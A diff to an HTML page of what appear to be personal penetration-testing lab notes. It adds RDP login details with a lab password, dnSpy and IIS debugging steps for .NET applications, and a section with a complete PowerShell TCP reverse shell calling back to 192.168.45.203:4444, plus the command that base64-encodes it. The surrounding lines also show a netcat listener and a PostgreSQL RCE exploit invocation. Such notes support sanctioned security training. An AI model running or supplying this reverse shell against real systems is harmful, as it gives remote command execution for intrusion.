@@ -80,10 +80,16 @@
 		<!-- sidebar.html -->
 <ul>
   <li>
+    <p><a href="#exercise-notes">Exercise Notes</a></p>
+  </li>
+  <li>
     <p><a href="#remote-debugging">Remote Debugging</a></p>
   </li>
   <li>
     <p><a href="#SQL-injection-RCE">SQL Injection RCE</a></p>
+  </li>
+  <li>
+    <p><a href="#encoded-reverse-shell">Encoded Reverse Shell</a></p>
   </li>
   
 <!-- sidebar.html end -->
@@ -127,6 +133,28 @@
 1. Open a Remote Window
 2. Enter ssh creds
 3. Transfer source code to remote server (scp)
+</code></pre></div></div>
+
+<hr>
+
+<h2 id="exercise-notes">Exercise Notes</h2>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>xfreerdp +nego +sec-rdp +sec-tls +sec-nla /d: /u: /p: /v:dnn /u:administrator /p:studentlab /size:1180x708 /tls-seclevel:0
+</code></pre></div></div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>### [.NET] Better debugging experience - more flexible setting breakpoints
+    # Right click module in Dnspy > Edit Assembly Attributes (C#)...
+    # Replace this:
+        [assembly: Debuggable(DebuggableAttribute.DebuggingModes.IgnoreSymbolStoreSequencePoints)]
+    # By this:
+        [assembly: Debuggable(DebuggableAttribute.DebuggingModes.Default | DebuggableAttribute.DebuggingModes.DisableOptimizations | DebuggableAttribute.DebuggingModes.IgnoreSymbolStoreSequencePoints | DebuggableAttribute.DebuggingModes.EnableEditAndContinue)]
+    # Compile > File > Save Module
+    # CMD: iisreset /noforce
+</code></pre></div></div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>### [.NET] IIS will make copies of all modules and load from temporary directory when its worker process starts > To debug: Attach w3wp.exe to Dnspy
+    # Open application in browser
+    # Dnspy > Debug > Attach to Process > select w3wp.exe
+    # Debug > Break All
+    # Debug > Windows > Modules > Right click any module > Open All Modules
 </code></pre></div></div>
 <hr>
 
@@ -188,6 +216,17 @@
 nc -lnvp 4444
 python2 postgresql_extension_rce_with_large_object.py 192.168.192.113:8443 192.168.45.181 4444
 </code></pre></div></div>
+
+<h2 id="encoded-reverse-shell">Encoded Reverse Shell</h2>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#Powershell
+[raw - powershellcmd.txt]
+$client = New-Object System.Net.Sockets.TCPClient('192.168.45.203',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};
+
+[encoded]
+$ iconv -f ASCII -t UTF-16LE powershellcmd.txt | base64 | tr -d "\n"
+</code></pre></div></div>
+
 <!-- END -->
 <hr>
 </div>
